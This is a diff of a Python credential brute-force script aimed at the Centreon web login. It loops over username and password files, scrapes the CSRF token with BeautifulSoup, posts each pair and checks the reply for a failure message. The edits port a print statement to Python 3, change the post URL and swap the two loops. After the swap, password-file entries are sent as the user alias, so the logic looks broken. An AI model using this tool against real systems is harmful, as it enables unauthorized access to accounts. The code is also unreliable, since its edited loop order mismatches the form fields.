@@ -23,9 +23,9 @@ passwords = sys.argv[3]
 errorMessage = sys.argv[4]
 
 
-with open(usernames) as f1:
+with open(passwords) as f1:
 	for line1 in f1:
-		with open(passwords) as f2:
+		with open(usernames) as f2:
 			for line2 in f2:
 				request = requests.session()
 				print("[+] Retrieving CSRF token to submit the login form")
@@ -35,7 +35,7 @@ with open(usernames) as f1:
 				soup = BeautifulSoup(html_content)
 				token = soup.findAll('input')[3].get("value")
 
-				print "testing "+line1.rstrip()+":"+ line2.rstrip()
+				print("testing "+line1.rstrip()+":"+ line2.rstrip())
 
 				login_info = {
 				    "useralias": line1.rstrip(),
@@ -44,7 +44,7 @@ with open(usernames) as f1:
 				    "centreon_token": token
 				}
 
-				login_request = request.post(url+"/index.php", login_info)
+				login_request = request.post(url, login_info)
 				print("[+] Login token is : {0}".format(token))
 
 				if errorMessage in login_request.text:
